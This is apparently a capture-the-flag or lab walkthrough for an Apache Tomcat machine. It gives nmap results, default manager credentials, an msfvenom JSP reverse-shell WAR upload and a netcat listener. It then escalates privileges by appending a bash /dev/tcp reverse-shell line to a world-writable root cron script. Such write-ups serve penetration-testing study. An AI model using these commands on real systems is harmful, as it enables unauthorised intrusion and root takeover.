## INFORMATION GATHERING
```bash
# IP ADDRESS
10.10.217.94

# CREDENTIALS  
tomcat:s3cret
```
## OPEN PORTS DETAILS
```bash
22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
8009/tcp open  ajp13   syn-ack ttl 61 Apache Jserv (Protocol v1.3)
8080/tcp open  http    syn-ack ttl 61 Apache Tomcat 8.5.5
```
# ENUMERATION
## PORT 8080
```bash
- Default Credentails Worked on http://10.10.217.94:8080/manager/html
- Credentials
	- tomcat:s3cret
```
## INITIAL FOOTHOLD
```bash
- Upload Reverse Shell War File and Deploy
sudo msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.13.80.25 LPORT=8080 -f war -o shell.war

- Start Listener
- Access http://10.10.217.94:8080/shell/

sudo nc -nvlp 8080                                                                        
listening on [any] 8080 ...                                                                   
connect to [10.13.80.25] from (UNKNOWN) [10.10.217.94] 58418                                  
id                                                                                            
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)             
```
## PRIVILEGE ESCALATION
```bash
- Writable file executed by root as cronjob

tomcat@ubuntu:/home/jack$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    cd /home/jack && bash id.sh

- File Permission
4.0K -rwxrwxrwx 1 jack jack   26 Aug 14  2019 id.sh

tomcat@ubuntu:/home/jack$ echo "bash -i >& /dev/tcp/10.13.80.25/8080 0>&1" >> id.sh 
tomcat@ubuntu:/home/jack$ cat id.sh 
#!/bin/bash
id > test.txt
bash -i >& /dev/tcp/10.13.80.25/8080 0>&1

sudo nc -nvlp 8080
listening on [any] 8080 ...
connect to [10.13.80.25] from (UNKNOWN) [10.10.7.95] 35982
bash: cannot set terminal process group (820): Inappropriate ioctl for device
bash: no job control in this shell
root@ubuntu:/home/jack# id
id
uid=0(root) gid=0(root) groups=0(root)

# root
```
# ENUMERATION OUTPUTS
## NMAP
```bash
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fc:05:24:81:98:7e:b8:db:05:92:a6:e7:8e:b0:21:11 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDL+0hfJnh2z0jia21xVo/zOSRmzqE/qWyQv1G+8EJNXze3WPjXsC54jYeO0lp2SGq+sauzNvmWrHcrLKHtugMUQmkS9gD/p4zx4LjuG0WKYYeyLybs4WrTTmCU8PYGgmud9SwrDlEjX9AOEZgP/gj1FY+x+TfOtIT2OEE0Exvb86LhPj/AqdahABfCfxzHQ9ZyS6v4SMt/AvpJs6Dgady20CLxhYGY9yR+V4JnNl4jxwg2j64EGLx4vtCWNjwP+7ROkTmP6dzR7DxsH1h8Ko5C45HbTIjFzUmrJ1HMPZMo9ss0MsmeXPnZTmp5TxsxbLNJGSbDv7BS9gdCyTf0+Qq1
|   256 60:c8:40:ab:b0:09:84:3d:46:64:61:13:fa:bc:1f:be (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBG6CiO2B7Uei2whKgUHjLmGY7dq1uZFhZ3wY5EWj5L7ylSj+bx5pwaiEgU/Velkp4ZWXM//thL6K1lAAPGLxHMM=
|   256 b5:52:7e:9c:01:9b:98:0c:73:59:20:35:ee:23:f1:a5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIwYtK4oCnQLSoBYAztlgcEsq8FLNL48LyxC2RfxC+33
8009/tcp open  ajp13   syn-ack ttl 61 Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http    syn-ack ttl 61 Apache Tomcat 8.5.5
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/8.5.5
```

